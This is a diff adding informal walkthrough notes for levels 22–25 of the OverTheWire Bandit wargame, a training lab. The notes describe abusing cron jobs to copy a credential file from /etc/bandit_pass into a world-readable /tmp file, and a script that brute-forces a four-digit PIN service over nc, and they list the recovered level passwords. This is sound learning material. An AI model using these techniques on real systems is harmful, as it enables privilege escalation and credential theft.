@@ -181,6 +181,33 @@ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 password is "tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q"
 
 22-23:
+ssh bandit22@bandit.labs.overthewire.org -p 2220
+check ls /etc/cron.d
+read    cat cronjob-bandit23
+/usr/bin/cronjob_bandit23.sh 
+now we need what is $mytarget
+for that we run echo I am user $myname | md5sum | cut -d ' ' -f 1 by replacing $myname with bandit23 to get the $mytarget for that
+hence we get the password by running the command   cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+and the password is "0Zf11ioIjMVN551jX3CmStKLYqjk54Ga"
 
+23->24:
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+cd /etc/cron.d
+here we can see from the scripts that every script in that directory runs every minute so we insert out script which gives us the password to passiw.txt file 
+  GNU nano 7.2                      passi.sh                                #!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/deer/passiw.txt
+by giving permissions to the group using chmod 777 we make it run in our way 
+and we get password in passiw.txt file which is "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
 
+24-25:
+here i can see i have to do the brute force attack hecne i write and execute this script
+  GNU nano 7.2                      daemo.sh                                #!/bin/bash
+for i in {0000..9999}
+do
+  echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
+done
+now i run ./daemo.sh | nc localhost 30002 | grep -vi "wrong"
+hence i get the password as "iCi86ttT4KSNe1armKiwbQNmB3YJP3q4"
+
+25-26:
 
